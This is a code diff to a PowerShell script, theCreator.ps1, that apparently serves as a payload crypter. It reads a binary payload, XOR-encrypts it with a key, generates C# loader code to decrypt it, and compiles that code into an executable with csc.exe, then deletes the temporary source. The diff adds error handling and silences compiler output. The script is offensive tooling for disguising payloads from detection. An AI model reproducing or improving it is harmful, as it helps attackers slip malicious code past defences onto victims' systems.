@@ -8,14 +8,10 @@ function generateSC($file, $key){
     $file = [System.IO.File]::ReadAllBytes($file)
     $key = $key
     [Byte[]] $buf = $file
-
-
     [Byte[]] $XORkey = [System.Text.Encoding]::ASCII.GetBytes($key)	# Set the XOR key here and remember to use the same one in expeditus.cs (approx line 125) for decryption
     [Byte[]] $ciphertext = $buf
-
     $keychar = 0
     $cipherchar = 0
-
     $buf | foreach-object -process {
 	    $ciphertext[$cipherchar] = ($_ -bxor $XORkey[$keychar])
 
@@ -185,24 +181,26 @@ function generateCS($payload, $key){
     return $csCode
 }
 function main($key, $inputBinFile, $outputPath){
-    Write-Host "Generating Key"
+    Write-Host "Generating Key and XORing payload"
     $payload = generateSC $inputBinFile $key
     Write-Host "Generating CS Code"
     $csCode = generateCS $payload $key
     Write-Host "Compiling CS Code"
     $filePath = "$env:TEMP\thecreator.cs"
     $csCode | Out-File $filePath
-    C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:$outputPath $filePath
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:$outputPath $filePath | Out-Null
     Write-Progress "Cleaning Temp Files in $filePath"
     rm $filePath
     Write-Progress "Done, check $outputPath"
-
 }
 #####
 #Initialize
-if ($inputBinFile -or $outputPath -eq $null) {
+if ($inputBinFile -and $outputPath -ne $null) {    
+    try{main $key $inputBinFile $outputPath}
+    catch{Write-Host "Error occured, check inputs"}
+}
+else{
     Write-Host "Usage: theCreator.ps1 <inputBinFile> <Output Path>`nExample: theCreator.ps1 C:\Temp\payload.bin C:\Temp\output.exe"
     exit
 }
-main $key $inputBinFile $outputPath
 #####
